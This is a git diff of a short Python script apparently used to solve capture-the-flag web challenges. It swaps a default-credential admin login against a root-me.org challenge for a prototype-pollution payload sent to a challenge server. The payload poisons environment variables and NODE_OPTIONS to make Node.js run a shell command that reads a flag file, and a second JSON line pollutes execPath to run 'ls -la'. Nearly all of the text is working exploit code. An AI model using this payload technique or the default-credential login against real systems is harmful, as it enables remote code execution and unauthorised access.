@@ -1,32 +1,14 @@
 import requests
-import json
-from flask import Flask, request, jsonify
 
-url1 = "http://challenge01.root-me.org/web-serveur/ch63/admin"
+url = "http://138.68.155.238:30428/api/calculate"
+url1 = "http://138.68.155.238:30428/debug/version"
+headers = {"Cotent-Type":"application/json"}
+payload = '''{"name":"Cat","constructor":{"prototype":{"env":{ "EVIL":"console.log(require('child_process').execSync('cat flag_e1T6f').toString())//"},"NODE_OPTIONS":"--require /proc/self/environ"}}}'''
 
-url2 = "http://challenge01.root-me.org/web-serveur/ch63/login"
+requests.post(url,data=payload,headers=headers)
 
-
-headers = {
-	"Content-Type":"application/json"
-}
-data ={
-     "username":"admin",
-     "password":"admin"
-}
-data =json.dumps(data)
-
-
-x = requests.post(url2,headers=headers,data=data)
-
-y = json.loads(x.text)["access_token"]
-
-headers = {
-	"Authorization":"Bearer "+y+"=="
-}
-
-x = requests.get(url1,headers=headers)
-
+x = requests.get(url1)
 print(x.text)
 
 
+{"constructor" :{"prototype": {"execPath": "ls", "execArgv": ["-la", "."]}}}
